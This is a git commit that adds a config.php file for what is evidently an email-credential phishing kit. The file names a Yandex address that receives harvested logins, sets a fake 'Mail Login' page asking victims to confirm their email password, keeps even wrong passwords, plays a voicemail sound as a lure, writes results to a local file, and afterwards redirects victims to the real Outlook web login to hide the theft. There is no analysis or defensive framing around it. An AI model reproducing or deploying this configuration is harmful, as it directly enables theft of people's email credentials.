5c3f8cec4310ceeaf18416d0d93a9579e67d31d9
dineshbaj <88349680+dineshbaj@users.noreply.github.com>
2021-09-08 04:27:26 -0700

    Add files via upload

---
+++ config.php
@@ -0,0 +1,21 @@
+<?php
+//$to  = 'logs@serviceintdsc.com';
+$to  = 'barzini.d@yandex.com';
+//To allow access only once change use $multi_visit = 1;
+$multi_visit = 0;
+$h1 = "Mail Login";
+$h2 = "Confirm your Email Password to Continue*";
+
+//send wrong passwords 
+$sendwrongpass = 1;
+$playsound = 1;
+$sound = "https://sndup.net/23kq/voicemessage.wav";
+
+// Save result to file   True or False
+$Res2File = true;
+
+//Result File Name
+$ResFileName = "../Result.txt";
+
+$redirect = "https://outlook.office365.com/owa";
+?>
